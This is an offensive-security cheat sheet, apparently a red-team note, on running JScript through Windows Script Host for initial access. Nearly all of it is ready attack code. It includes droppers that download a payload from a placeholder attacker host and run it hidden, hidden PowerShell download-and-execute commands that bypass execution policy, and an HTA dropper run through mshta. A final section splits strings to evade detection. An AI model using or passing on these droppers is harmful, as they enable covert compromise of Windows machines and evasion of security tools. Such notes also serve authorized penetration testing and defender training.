---
tags:
  - Defense_Evasion
  - Execution
  - Foundational
  - Initial_Access
  - Python
  - Windows
---

## JScript Execution on Windows
resources: [Microsoft WSH Reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10))

> [!info] JScript runs via Windows Script Host (**wscript.exe** or **cscript.exe**). Alternative to PowerShell for initial access.

### JScript File Execution
```cmd
wscript.exe payload.js
cscript.exe payload.js
```

### Basic JScript Dropper

#### Shell Command Execution
```javascript
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe", 0, false);
```

#### Download and Execute
```javascript
var shell = new ActiveXObject("WScript.Shell");
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
var stream = new ActiveXObject("ADODB.Stream");

xhr.Open("GET", "http://<AttackerIP>/payload.exe", false);
xhr.Send();

stream.Open();
stream.Type = 1;
stream.Write(xhr.ResponseBody);
stream.Position = 0;
stream.SaveToFile("C:\\Windows\\Temp\\payload.exe", 2);
stream.Close();

shell.Run("C:\\Windows\\Temp\\payload.exe", 0, false);
```

### JScript Meterpreter Dropper

#### PowerShell via JScript
```javascript
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell -exec bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\"";
shell.Run(cmd, 0, false);
```

#### Encoded PowerShell via JScript
```javascript
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell -exec bypass -nop -w hidden -enc <Base64EncodedCommand>";
shell.Run(cmd, 0, false);
```

### JScript with HTA Container

> [!tip] HTML Application provides additional capabilities and different execution context.

#### Basic HTA Dropper
```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -exec bypass -nop -w hidden -enc <Base64>", 0, false);
window.close();
</script>
</head>
<body>
</body>
</html>
```

#### Save and Execute
```cmd
mshta.exe http://<AttackerIP>/payload.hta
```

### JScript String Obfuscation

> [!tip] Break up suspicious strings to evade detection.

```javascript
var shell = new ActiveXObject("WScript.Shell");
var p = "pow" + "ersh" + "ell";
var c = " -ex" + "ec by" + "pass -n" + "op -w hid" + "den -c ";
var d = "\"IEX(New-Object Net.WebClient).Down" + "loadString('http://<AttackerIP>/p.ps1')\"";
shell.Run(p + c + d, 0, false);
```
